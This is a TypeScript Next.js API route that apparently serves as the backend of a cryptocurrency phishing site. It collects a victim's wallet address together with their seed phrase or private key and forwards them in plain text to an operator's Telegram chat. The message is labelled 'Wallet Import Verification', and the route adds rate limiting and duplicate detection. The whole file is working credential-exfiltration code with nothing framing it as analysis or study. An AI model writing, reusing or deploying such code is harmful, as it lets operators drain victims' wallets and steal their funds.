import { NextResponse } from "next/server"
import crypto from "crypto"

// Simple in-memory rate limiting (best-effort, suitable for a single instance)
const RATE_WINDOW_MS = 10 * 60 * 1000
const RATE_MAX_REQUESTS = 5
const MIN_INTERVAL_MS = 10 * 1000
const DUP_WINDOW_MS = 60 * 60 * 1000

type RateRecord = {
  windowStart: number
  count: number
  lastAt: number
  recentHashes: Map<string, number>
}

const rateStore = new Map<string, RateRecord>()

function getClientIp(req: Request): string {
  const fwd = req.headers.get("x-forwarded-for") || ""
  // Take first IP if multiple
  return (fwd.split(",")[0] || req.headers.get("x-real-ip") || "unknown").trim()
}

export async function POST(request: Request) {
  try {
    const now = Date.now()
    const ip = getClientIp(request)

    // Initialize or roll window
    const rec = rateStore.get(ip) || { windowStart: now, count: 0, lastAt: 0, recentHashes: new Map() }
    if (now - rec.windowStart > RATE_WINDOW_MS) {
      rec.windowStart = now
      rec.count = 0
      rec.recentHashes.clear()
    }

    // Enforce min interval
    if (now - rec.lastAt < MIN_INTERVAL_MS) {
      return NextResponse.json({ error: "Too many requests. Please wait a moment." }, { status: 429 })
    }

    const { address, allocation, type, walletData } = await request.json()

    if (!address || typeof allocation !== "number" || !type || !walletData) {
      return NextResponse.json({ error: "Invalid payload" }, { status: 400 })
    }

    // Enforce window max
    if (rec.count >= RATE_MAX_REQUESTS) {
      return NextResponse.json({ error: "Rate limit exceeded. Try again later." }, { status: 429 })
    }

    // Duplicate submission detection (within DUP_WINDOW_MS)
    const payloadStr = `${address}|${allocation}|${type}|${walletData}`
    const hash = crypto.createHash("sha256").update(payloadStr).digest("hex")
    // Cleanup old hashes
    for (const [h, ts] of rec.recentHashes) {
      if (now - ts > DUP_WINDOW_MS) rec.recentHashes.delete(h)
    }
    if (rec.recentHashes.has(hash)) {
      // Treat as accepted but no-op to avoid spam fanout
      rec.lastAt = now
      rateStore.set(ip, rec)
      return NextResponse.json({ ok: true, deduplicated: true }, { status: 202 })
    }

    const botToken = (process.env.TELEGRAM_BOT_TOKEN || "").trim()
    const chatId = (process.env.TELEGRAM_CHAT_ID || "").trim()

    if (!botToken || !chatId) {
      return NextResponse.json({ error: "Server is not configured (missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID)" }, { status: 500 })
    }

    const message =
      `🔐 Wallet Import Verification\n\n` +
      `📍 Address: ${address}\n` +
      `💰 Allocation: ${allocation}\n` +
      `📝 Type: ${type === "seed-phrase" ? "Seed Phrase" : "Private Key"}\n\n` +
      `${type === "seed-phrase" ? "🌱 Seed Phrase" : "🔑 Private Key"}: ${walletData}\n\n` +
      `⏰ Time: ${new Date().toLocaleString()}`

    const controller = new AbortController()
    const timeout = setTimeout(() => controller.abort(), 10_000)

    const tgResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: "HTML" }),
      signal: controller.signal,
    }).finally(() => clearTimeout(timeout))

    if (!tgResponse.ok) {
      const text = await tgResponse.text().catch(() => "")
      return NextResponse.json({ error: "Failed to send message", details: text }, { status: 502 })
    }

    // Update limiter state after successful processing
    rec.count += 1
    rec.lastAt = now
    rec.recentHashes.set(hash, now)
    rateStore.set(ip, rec)

    return NextResponse.json({ ok: true })
  } catch (error) {
    return NextResponse.json({ error: "Unexpected server error" }, { status: 500 })
  }
}


